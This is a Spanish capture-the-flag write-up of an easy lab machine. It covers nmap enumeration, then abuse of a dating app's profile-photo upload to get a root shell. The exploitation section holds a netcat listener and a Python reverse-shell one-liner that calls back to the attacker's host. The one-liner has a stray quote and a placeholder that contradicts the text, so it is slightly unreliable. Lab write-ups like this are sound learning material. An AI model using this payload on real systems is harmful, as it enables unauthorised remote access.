## Resumen

Es una máquina de dificultad fácil en la que se explota la subida de foto de perfil para conseguir acceso con una revshell.

## Enumeración

Empiezo haciendo un ping para saber el sistema operativo de la máquina.

`ping -c 1 <vmip>`

`64 bytes from <vmip>: icmp_seq=1 ttl=62 time=29.3 ms`

Con esto sé que la máquina es Linux.


Sigo con nmap para escanear los puertos abiertos.

`nmap -sVC -p- --min-rate 5000 <vmip> -oG nmap`

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2f:85:fd:31:49:37:43:0f:5a:5d:29:11:1e:38:7a:7b (ECDSA)
|_  256 33:b6:53:61:f3:3e:77:cb:fc:da:ea:c1:8c:65:d9:bf (ED25519)
5000/tcp open  http    Werkzeug httpd 3.1.5 (Python 3.10.12)
|_http-title: LoveConnect - Speed Chatter
|_http-server-header: Werkzeug/3.1.5 Python/3.10.12
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


Puertos encontrados: `22/ssh`, `5000/Werkzeug`.

Como por ahora no tengo credenciales, empiezo por el `Werkzeug`.


## Análisis puerto 5000

Empiezo entrando a la web y veo que es una aplicación de citas en la que hay un chat y una función para cambiarse la foto.


![Web de LoveConnect](Imagenes/web.png)

Intenté inyectar XSS mediante el chat, pero filtraba los signos especiales, así que lo siguiente fue ver si podía subir una revshell de Python usando la función de cambiarse la foto.


## Explotación

Pongo el listener:

`nc -lvnp 4444`

Subo la revshell como archivo Python. En el script, `RHOST` es mi IP (la de la VPN, no la de la máquina víctima) y `RPORT` es el `4444` del listener.

```python
export RHOST=<vmip>";export RPORT=<PORT>;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

Una vez subida, se abre una conexión con el usuario root y al hacer un `ls` encuentro un .txt con la flag.

`THM{R3v3rs3_Sh3ll_L0v3_****}`


Dando así por terminada la máquina.


## Flujo de ataque


1. **Enumeración:** Se encuentran los puertos `22/ssh` y `5000/Werkzeug`.
2. **Análisis puerto 5000:** En la web se encuentra una función de subida de fotos de perfil que se podría explotar.
3. **Explotación:** Se sube una revshell de Python a la función vulnerable, consiguiendo acceso como root y pudiendo acceder a la flag.